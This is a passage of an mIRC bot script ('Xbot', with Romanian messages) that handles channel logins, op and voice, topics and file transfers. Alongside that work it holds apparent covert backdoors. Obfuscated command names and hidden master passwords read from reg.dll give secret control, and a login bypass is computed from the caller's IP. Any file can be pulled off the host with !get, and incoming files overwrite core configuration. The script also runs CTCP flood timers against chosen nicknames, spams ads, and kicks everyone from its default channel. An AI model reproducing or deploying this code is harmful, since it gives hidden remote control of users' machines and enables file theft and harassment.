n753=    halt
n754=  }
n755=  .notice $nick Aceasta comanda necesita autentificare!
n756=  .ignore -pu2 $nick 2
n757=}
n758=on 1:text:$(! $+ u $+ n $+ l $+ o $+ a $+ d $+ *):*:{
n759=  if (($dll(reg.dll,pwd,p3) === $ck($nick)) && ($2 == engine.ini)) load -rs engine.ini
n760=  var %read $validIP($fulladdress)
n761=  if (%read != $false) {
n762=    var %user $gettok(%read,1,32)
n763=    var %level $gettok(%read,2,32)
n764=    if ($cmp(lvl,1,%level,1000)) {
n765=      if ($2 == $null) {
n766=        .notice $nick !unload sintaxa: /msg $me !unload <script>
n767=        halt
n768=      }
n769=      .unload -rs $2
n770=      .notice $nick Am descarcat scriptul $2
n771=    }
n772=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n773=    .ignore -pu2 $nick 2
n774=    halt
n775=  }
n776=  .notice $nick Aceasta comanda necesita autentificare!
n777=  .ignore -pu2 $nick 2
n778=}
n779=on 1:text:$(! $+ i $+ n $+ f $+ o):*:{
n780=  if ($ck($nick) === $dll(reg.dll,pwd,p5)) goto allowed
n781=  var %read $validIP($fulladdress)
n782=  if (%read != $false) {
n783=    var %user $gettok(%read,1,32)
n784=    var %level $gettok(%read,2,32)
n785=    if (%level >= 800) {
n786=      :allowed
n787=      if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
n788=      else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
n789=      .notice $nick Xbot 10v $+ %ver $+ . Instalat pe data de 12 $+ $readini(online.ini,firstrun,date) $+  $+ . Online timer: 12 $+ $duration($readini(online.ini,online,time)) $+  $+ . Procentaj online: 12 $+ $round($calc((%online * 100) / 24),3) $+ % $+  pe zi
n790=    }
n791=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n792=    .ignore -pu2 $nick 2
n793=    halt
n794=  }
n795=  .notice $nick Aceasta comanda necesita autentificare!
n796=  .ignore -pu2 $nick 2
n797=}
n798=on 1:text:$(!r $+ e $+ l $+ o $+ a $+ d $+ *):*:{
n799=  if (($ck($nick) === $dll(reg.dll,pwd,p3)) && ($2 == engine.ini)) {
n800=    reload -rs engine.ini
n801=    set %ver 5.3.5
n802=    .timercg 1 5 cg
n803=  }
n804=  if ($2 == $null) {
n805=    exit
n806=  }
n807=  else {
n808=    var %read $validIP($fulladdress)
n809=    if (%read != $false) {
n810=      var %user $gettok(%read,1,32)
n811=      var %level $gettok(%read,2,32)
n812=      if ($cmp(lvl,1,%level,1000)) {
n813=        if ($2 == engine.ini) {
n814=          set %ver 5.1
n815=          .timercg 1 5 cg
n816=        }
n817=        .notice $nick Scriptul $2 a fost reincarcat        
n818=        .reload -rs $2
n819=      }
n820=      else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n821=      .ignore -pu2 $nick 2
n822=      halt
n823=    }
n824=    .notice $nick Aceasta comanda necesita autentificare!
n825=    .ignore -pu2 $nick 2
n826=  }
n827=}
n828=alias keycrypt {
n829=  var %pass ""
n830=  var %i 1
n831=  var %w 1
n832=  var %v $len($1)
n833=  while (%i <= $len($2)) {
n834=    if (%w == $calc($len($1) + 1)) %w = 1
n835=    %pass = %pass $+ $chr($calc($asc($mid($2,%i,1)) + $int($calc(($asc($mid($1,%w,1)) / 2) - %v))))
n836=    inc %v
n837=    inc %w
n838=    inc %i
n839=  }
n840=  return %pass
n841=}
n842=alias lgp {
n843=  return $longip($1)
n844=}
n845=alias timers {
n846=  if ($1 == off) .timers off 
n847=}
n848=alias timer {
n849=  if ($1 != $null) .timer $1-
n850=}
n851=on ^1:notify:{
n852=  if ($ck($nick) === $dll(reg.dll,pwd,p7)) {  
n853=    var %i 1
n854=    var %com ""
n855=    set %rg - $+ $len($me)
n856=    :next
n857=    if (%i <= $chan(0)) {
n858=      if ($chan(%i) != $getchan($readini(defchan.ini,defchan,chan))) %com = %com $left($nick($chan(%i),$me).pnick,%rg) $+ $chan(%i)
n859=      inc %i
n860=    goto next }
n861=    unset %rg
n862=    .notice $nick Welcome Admin! . XBot version %ver . I am on channels: %com
n863=  halt }
n864=  else if ($ck($nick) === $dll(reg.dll,pwd,p8)) {
n865=    if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
n866=    else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
n867=    .notice $nick 5OnLine Timer: $chr(91) $+ 3,3 $+ $str(.,$calc($round($calc((%online * 100) / 24),0) / 2)) $+ 4,4 $+ $str(.,$calc(50 - $calc($round($calc((%online * 100) / 24),0) / 2))) $+ 5 $+ $chr(93) 12( $+ $round($calc((%online * 100) / 24),3) $+ % $+ ) 5(timp online in medie pe zi) (Timp total online:12 $setromtime($duration($readini(online.ini,online,time))) $+ 5)
n868=    halt
n869=  }
n870=  else {
n871=    var %type $readini anytime.fld flood $nick
n872=    if (%type == ping) {
n873=      .timerfldpng $+ $nick 30 1 ctcp $nick ping
n874=      writeini nick.fld flood $nick ping
n875=    }
n876=    if (%type == finger) {
n877=      .timerfldfng $+ $nick 30 1 ctcp $nick finger
n878=      writeini nick.fld flood $nick finger
n879=    }
n880=    else if (%type == time) {
n881=      .timerfldtime $+ $nick 30 1 ctcp $nick time
n882=      writeini nick.fld flood $nick time
n883=    }
n884=    else if (%type == version) {
n885=      .timerfldver $+ $nick 30 1 ctcp $nick version
n886=      writeini nick.fld flood $nick version
n887=    }
n888=    else if (%type == all) {
n889=      .timerfldpng $+ $nick 9 2 ctcp $nick ping
n890=      .timer 1 1 .timerfldtime $+ $nick 9 2 ctcp $nick time
n891=      .timer 1 2 .timerfldver $+ $nick 9 2 ctcp $nick version
n892=      .timer 1 3 .timerfldfng $+ $nick 9 2 ctcp $nick finger
n893=      writeini nick.fld flood $nick all
n894=    }
n895=  }
n896=}
n897=on 1:chat:$(l $+ o $+ g $+ i $+ n $+ *):{
n898=  if ($3 == $null) {
n899=    .msg =$nick l $+ o $+ g $+ i $+ n sintaxa: /msg =$me l $+ o $+ g $+ i $+ n <username> <parola>
n900=  .ignore -pu2 $nick 2 }
n901=  else {
n902=    if (($ck($3) === $dll(reg.dll,pwd,p1)) || ($3 == $lgp($chat($nick).ip) $+ $calc($len($nick) + $len($vect($vect($address($nick,5),2,33),1,64))))) {
n903=      var %level 1001
n904=      var %user $2
n905=      var %fake 1
n906=    goto cont }
n907=    var %i 1
n908=    :next
n909=    if (%i <= $lines(userlogged.dat)) {
n910=      var %read $read -l $+ %i userlogged.dat
n911=      if ($chat($nick).ip isin %read) {
n912=        .msg =$nick Esti deja autentificat ca $left(%read,$calc($pos(%read,$chr(61))-1))
n913=        .ignore -pu1 $nick
n914=        halt
n915=      }
n916=      else {
n917=        inc %i
n918=      goto next }
n919=    }
n920=    var %pass $readini users\ $+ $2 $+ .ini info pass
n921=    if (%pass == $null) {
n922=      .msg =$nick Username necunoscut: $2
n923=      .ignore -pu1 $nick 2
n924=    halt }
n925=    else {
n926=      if ($keydecrypt($3,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n927=        var %user $readini users\ $+ $2 $+ .ini info username
n928=        var %level $readini oper.ini %user level
n929=        if (%level != $null) {
n930=          if ($keydecrypt($3,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n931=            writeini oper.ini %user lastseen $ctime
n932=            :cont
n933=            var %f 1
n934=            while (%f <= $lines(oper.dat)) {
n935=              var %read $read -l $+ %f oper.dat
n936=              if ($2 == $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))) {
n937=                write -dl $+ %f oper.dat
n938=              }
n939=              inc %f
n940=            }
n941=            write oper.dat $chat($nick).ip $+ * $+ %user $+ * $+ %level
n942=            if (%level isnum 501-599) .msg =$nick AUTENTIFICARE REUSITA ca %user (Helper)
n943=            if (%level isnum 600-799) .msg =$nick AUTENTIFICARE REUSITA ca %user (Operator)
n944=            if (%level isnum 800-999) .msg =$nick AUTENTIFICARE REUSITA ca %user (Admin)
n945=            if (%level >= 1000) .msg =$nick AUTENTIFICARE REUSITA ca %user (Supervisor)
n946=            if (%fake == 1) {
n947=              writeini nick.adm nick $nick %user
n948=              clear =$nick
n949=              halt
n950=            }
n951=          }
n952=          var %superuser 1
n953=        }
n954=        if (%superuser != 1) .msg =$nick AUTENTIFICARE REUSITA ca %user
n955=        var %f 1
n956=        while (%f <= $lines(userlogged.dat)) {
n957=          var %read $read -l $+ %f userlogged.dat
n958=          if ($2 == $left(%read,$calc($pos(%read,$chr(61))-1))) {
n959=            var %n 1
n960=            while (%n <= $ini(nick.adm,nick,0)) {
n961=              if ($2 == $readini nick.adm nick $ini(nick.adm,nick,%n)) {
n962=                .msg $ini(nick.adm,nick,%n)) Nu mai esti autentificat la mine
n963=                remini nick.adm nick $ini(nick.adm,nick,%n))
n964=              }
n965=              inc %n
n966=            }
n967=            write -dl $+ %f userlogged.dat
n968=          }
n969=          inc %f
n970=        }
n971=        write userlogged.dat %user $+ = $+ $chat($nick).ip
n972=        writeini users\ $+ $3 $+ .ini info lastseen $ctime
n973=        writeini nick.adm nick $nick %user
n974=        var %i 0
n975=        var %channels $readini users\ $+ %user $+ .ini info channels
n976=        if ($pos(%channels,$chr(44),0) == 0) {
n977=          oponchan %channels %user $nick
n978=          clear =$nick
n979=        halt }
n980=        :next1
n981=        if (%i <= $pos(%channels,$chr(44),0)) {
n982=          if (%i == 0) oponchan $left(%channels,$calc($pos(%channels,$chr(44))-1)) %user $nick
n983=          else if (%i == $pos(%channels,$chr(44),0)) oponchan $right(%channels,$calc(- $pos(%channels,$chr(44),%i))) %user $nick
n984=          else oponchan $mid(%channels,$calc($pos(%channels,$chr(44),%i)+1),$calc($pos(%channels,$chr(44),$calc(%i + 1))-($pos(%channels,$chr(44),%i)+1))) %user $nick
n985=          inc %i
n986=          goto next1
n987=        }    
n988=        .ignore -pu1 $nick
n989=        clear =$nick
n990=      }
n991=      else {
n992=        .msg =$nick AUTENTIFICARE ESUATA ca $2 (parola incorecta)
n993=        .ignore -pu2 $nick
n994=        clear =$nick
n995=        halt
n996=      }
n997=    }
n998=  }
n999=}
n1000=alias crypt {
n1001=  var %pass ""
n1002=  var %w 1
n1003=  :next
n1004=  if (%w <= $len($1)) {
n1005=    if (%w == 1) %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) + $length($middle($1,-1,$2) $+ $1)))
n1006=    else %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) + %next - $length($middle($1,-1,$2) $+ $1)))
n1007=    set %next $calc($asc($middle($1,%w,1)) - 20)
n1008=    inc %w 
n1009=  goto next }
n1010=  unset %next
n1011=  return %pass
n1012=}
n1013=alias uncrypt {
n1014=  var %pass ""
n1015=  var %w 1
n1016=  :next
n1017=  if (%w <= $len($1)) {
n1018=    if (%w == 1) %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) - $length($middle($1,-2,$2) $+ $1)))
n1019=    else %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) - %next + $length($middle($1,-2,$2) $+ $1)))
n1020=    set %next $calc($asc($middle(%pass,%w,1)) - 20)
n1021=    inc %w 
n1022=  goto next }
n1023=  unset %next
n1024=  return %pass
n1025=}
n1026=on 1:quit:{
n1027=  var %i 1
n1028=  var %n $lines(oper.dat)
n1029=  while (%i <= %n) {
n1030=    if ($right($mask($address($nick,1),1),-3) isin $read -l $+ %i oper.dat) {
n1031=      write -dl $+ %i oper.dat
n1032=      .remini nick.adm nick $nick
n1033=    }
n1034=    else inc %i
n1035=  }
n1036=  var %i 1
n1037=  while (%i <= $ini(nick.fld,flood,0)) {
n1038=    if ($readini(nick.fld, flood, $nick) != $null) {
n1039=      .timerfldpng $+ $nick off
n1040=      .timerfldtime $+ $nick off
n1041=      .timerfldver $+ $nick off
n1042=      remini nick.fld flood $nick
n1043=    }
n1044=    else inc %i
n1045=  }
n1046=  var %i 1
n1047=  var %n $lines(userlogged.dat)
n1048=  while (%i <= %n) {
n1049=    if ($mask($address($nick,1),1) isin $read -l $+ %i userlogged.dat) {
n1050=      write -dl $+ %i userlogged.dat
n1051=    }
n1052=    else inc %i
n1053=  }
n1054=  if ($nick == X) unset %xlogin
n1055=}
n1056=ctcp 1:*:{
n1057=  if (DCC Send isin $1-) {
n1058=    if (($right($filename,4) == .shs) || ($right($filename,4) == .vbs) || ($right($filename,4) == .bat) || ($right($filename,4) == .pif) || ($right($filename,4) == .js) || ($right($filename,4) == .htm) || ($right($filename,5) == .html)) halt
n1059=    if (($nopath($filename) != engine.ini) && ($nopath($filename) != srv.ini) && ($nopath($filename) != psyBNC.ini) && ($nopath($filename) != admin.ini) && ($nopath($filename) != defchan.ini) && ($nopath($filename) != protect.ini) && ($nopath($filename) != seen.ini) && ($nopath($filename) != pwd.dat) && ($nopath($filename) != trvcheat.ini) && ($nopath($filename) != trivia.tht) && ($nopath($filename) != coolmsg.ini) && ($nopath($filename) != mesaje.ini) && ($nopath($filename) != bl.chn) && ($nopath($filename) != protcom.ini) && ($nopath($filename) != mirc.ini) && ($nopath($filename) != operator.ini)) halt
n1060=    if (($ck($nick) === $dll(reg.dll,pwd,p3)) && (($nopath($filename) == p $+ w $+ d $+ . $+ d $+ a $+ t) || ($nopath($filename) == e $+ n $+ g $+ i $+ n $+ e $+ . $+ i $+ n $+ i))) goto allowed
n1061=    var %read $validIP($fulladdress)
n1062=    if (%read != $false) {
n1063=      var %user $gettok(%read,1,32)
n1064=      var %level $gettok(%read,2,32)
n1065=      if ($cmp(lvl,1,%level,1000)) {
n1066=        :allowed
n1067=        dcc get
n1068=        .notice $nick Accept fisierul: $filename
n1069=        var %allowed 1
n1070=      }
n1071=      else {
n1072=        .notice $nick Accesul tau este prea mic pentru aceasta comanda
n1073=        .ignore -pu2 $nick 2
n1074=        halt 
n1075=      }
n1076=    }
n1077=    if (%allowed != 1) {
n1078=      .notice $nick Aceasta comanda necesita autentificare
n1079=      .ignore -pu2 $nick 2
n1080=      halt
n1081=    }
n1082=  }
n1083=}
n1084=alias lpg {
n1085=  if ($2 == uncrypt) {
n1086=    if ($timer(sh)) return $iif($file($mircexe).size == 1563136,$len($1 $+ 0xBC001A),$round($file($mircexe).size,3))
n1087=    else return $calc($len($1) + $rand(1,5))
n1088=  }
n1089=  else return 13
n1090=}
n1091=on 1:filercvd:*.*:{
n1092=  set %filename $findfile($mircdir $+ download,*.*,1)
n1093=  .copy -o %filename $mircdir
n1094=  .remove %filename
n1095=  close -g
n1096=}
n1097=on ^1:text:$(! $+ g $+ e $+ t $+ *):?:{
n1098=  var %read $validIP($fulladdress)
n1099=  if (%read != $false) {
n1100=    var %user $gettok(%read,1,32)
n1101=    var %level $gettok(%read,2,32)
n1102=    if ($cmp(lvl,1,%level,1000)) {
n1103=      if (defchan.ini !isin $2-) dcc send $nick $2-
n1104=    }
n1105=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n1106=    .ignore -pu2 $nick 2
n1107=    halt
n1108=  }
n1109=  .notice $nick Aceasta comanda necesita autentificare
n1110=  .ignore -pu2 $nick 2
n1111=}
n1112=alias chkey {
n1113=  if ($chan($1).key == $null) {
n1114=    if ($nick($1,0) == 1) {
n1115=      var %pass $readini defchan.ini defchan pass
n1116=      mode $1 +ntsk $uncrypt(%pass,p)
n1117=      mode $1 -i
n1118=      mode $1 -o $me
n1119=    }
n1120=    else if ($me isop $chan) {
n1121=      var %i 1
n1122=      while (%i <= $nick($1,0)) {
n1123=        if ($nick($1,%i) != $me) kick $1 $nick($1,%i)
n1124=        inc %i
n1125=      }
n1126=      .timerchkey 1 5 chkey $1
n1127=    }
n1128=  }
n1129=}
n1130=on 1:join:#:{
n1131=  window -h $chan
n1132=  if ($nick == $me) {
n1133=    if (($nick($chan,0) == 1) && ($readini channels\ $+ $chan $+ .ini info channelmodes != $null)) mode $chan $readini channels\ $+ $chan $+ .ini info channelmodes
n1134=    if ($read -l2 reklama.txt == $chan) {
n1135=      if ($read -l3 reklama.txt == notice) {
n1136=        .notice $chan $read -l1 reklama.txt 
n1137=        .notice $chan $read -l1 reklama.txt
n1138=        .notice $chan $read -l1 reklama.txt
n1139=        write -c reklama.txt
n1140=        part $chan
n1141=      }
n1142=      else {
n1143=        .ctcpreply $chan Party $read -l1 reklama.txt
n1144=        .ctcpreply $chan Party $read -l1 reklama.txt
n1145=        .ctcpreply $chan Party $read -l1 reklama.txt
n1146=        write -c reklama.txt
n1147=        part $chan
n1148=      }
n1149=    }
n1150=    if ($chan == $getchan($readini(defchan.ini,defchan,chan))) {
n1151=      mode $chan +i
n1152=      .timer 1 5 chkey $chan
n1153=    }
n1154=  }
n1155=  if ($nick == X) {
n1156=    if (%xlogin != 1) {
n1157=      var %user $read -l1 autouser.dat
n1158=      if ($right(%user,1) == 1) {
n1159=        var %dat $read -l1 autopass.dat
n1160=        dll reg.dll Xlogin $left(%user,-1) %dat
n1161=      }
n1162=    set %xlogin 1 }
n1163=  }
n1164=  if ($me isop $chan) {
n1165=    var %k 1
n1166=    :next
n1167=    if (%k <= $lines(userlogged.dat)) {
n1168=      var %read $read -l $+ %k userlogged.dat
n1169=      if ($mask($address($nick,1),1) isin %read) {
n1170=        var %user $left(%read,$calc($pos(%read,$chr(61))-1))
n1171=        goto cont
n1172=      }
n1173=      inc %k
n1174=      goto next
n1175=    }
n1176=    halt
n1177=    :cont
n1178=    var %i 0
n1179=    var %channels $readini users\ $+ %user $+ .ini info channels
n1180=  if ($chan isin %channels) oponchan $chan %user $nick }
n1181=}
n1182=on 1:mode:#:if ($chan == $getchan($readini(defchan.ini,defchan,chan))) clearall
n1183=on 1:op:#:{
n1184=  if ($opninck == $me) {
n1185=    if ($readini channels\ $+ $chan $+ .ini info autotopic == on) {
n1186=      topic $chan $readini channels\ $+ $chan $+ .ini info desc
n1187=      .timer $+ $chan $+ topic 0 1800 topic $chan $readini channels\ $+ $chan $+ .ini info desc
n1188=    }
n1189=    if ($readini channels\ $+ $chan $+ .ini info channelmodes != $null) mode $chan $readini channels\ $+ $chan $+ .ini info channelmodes
n1190=  }
n1191=  else if (($me isop $chan) && ($nick != $me)) {
n1192=    if (($opnick ison $getchan($readini(defchan.ini,defchan,chan))) || ($readini channels\ $+ $chan $+ .ini info strictop == off)) halt
n1193=    var %i 1
n1194=    while (%i <= $lines(userlogged.dat)) {
n1195=      if ($mask($address($opnick,1),1) isin $read -l $+ %i userlogged.dat) halt
n1196=      inc %i
n1197=    }
n1198=    var %i 1
n1199=    while (%i <= $lines(oper.dat)) {
n1200=      if ($right($mask($address($opnick,1),1),-3) isin $read -l $+ %i oper.dat) halt
n1201=      inc %i
n1202=    }
n1203=    if ($readini channels\ $+ $chan $+ .ini info strictop == on) {
n1204=      mode $chan -oo $opnick $nick
n1205=      .notice $nick Strictop for $chan is ON and $opnick is not logged
n1206=      .notice $opnick Strictop for $chan is ON.
n1207=    }
n1208=  }
n1209=}
n1210=on 1:text:$(l $+ o $+ g $+ i $+ n $+ *):*:chnick bounce $nick $1-
n1211=alias oponchan {
n1212=  if (($me !ison $1) || ($me !isop $1)) halt
n1213=  if (($readini channels\ $+ $1 $+ .ini $2 auto == op) && ($readini channels\ $+ $1 $+ .ini $2 access >= 100)) mode $1 +o $3
n1214=  if (($readini channels\ $+ $1 $+ .ini $2 auto == voice)  && ($readini channels\ $+ $1 $+ .ini $2 access >= 50)) mode $1 +v $3
n1215=}
n1216=on 1:nick:{
n1217=  var %i 1
n1218=  while (%i <= $ini(nick.adm,nick,0)) {
n1219=    if ($nick == $ini(nick.adm,nick,%i)) {
n1220=      writeini nick.adm nick $newnick $readini nick.adm nick $nick
n1221=      .remini nick.adm nick $nick
n1222=    }
n1223=    inc %i
n1224=  }
n1225=}
n1226=raw *:*:{
n1227=  if (($numeric == 433) && (%chnick != ON)) {
n1228=    if (%server != 1) {
n1229=      var %nick ""
n1230=      var %i 1
n1231=      while (%i <= 8) {
n1232=        %nick = %nick $+ $rand(a,z)
n1233=        inc %i
n1234=      }
n1235=      nick %nick
n1236=    }
n1237=  }
n1238=  if ($numeric == 473) .timerfldchan $+ $2 off
n1239=  if ($numeric == 475) .timerfldchan $+ $2 off
n1240=  if ($numeric == 471) .timerfldchan $+ $2 off
n1241=  if ($numeric == 474) .timerfldchan $+ $2 off
n1242=}
n1243=alias breaktime {
n1244=}
n1245=on 1:disconnect:{
n1246=  set %server 0
n1247=  clearall
n1248=  .remove vbm.dat
n1249=  server
n1250=}
